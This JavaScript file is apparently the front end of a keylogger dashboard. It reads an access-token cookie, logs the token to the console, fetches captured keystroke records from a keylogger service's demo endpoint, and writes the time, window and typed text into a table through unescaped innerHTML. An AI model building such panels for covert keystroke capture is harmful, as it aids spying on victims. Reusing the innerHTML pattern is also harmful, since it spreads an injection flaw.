async function getCookie(name) {
    const cookies = document.cookie.split('; ').map(cookie => cookie.split('='));
    for (let [key, value] of cookies) {
        if (key === name) {
            return decodeURIComponent(value);
        }
    }
    return null;
}





async function get_logs(){
    const token = await getCookie("access_token"); 
    console.log(token);
    
    
    if (!token) {
        window.location.href = "login.html";
        return;
    }

    let response = await fetch("https://keylogger.shuvax.com/api/get_demo", {
        method: "GET",
        headers: {
            "Authorization": `Bearer ${token}`
        }
    });
    let data = await response.json();
    return data;
}

async function fetchLogs() {
    const table = document.getElementById("Table");
    table.innerHTML = "<tr><td colspan='3' class='text-center'>Loading data...</td></tr>";

    const data = await get_logs();

    table.innerHTML = "";

    if (!Array.isArray(data) || data.length === 0) { 
        table.innerHTML = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
    } else {
        data.forEach(row => {
            const r = document.createElement("tr");
            r.innerHTML = `<td>${row.time}</td><td>${row.window}</td><td>${row.text}</td>`;
            table.appendChild(r);
        });  
    }
}

document.addEventListener("DOMContentLoaded", fetchLogs);
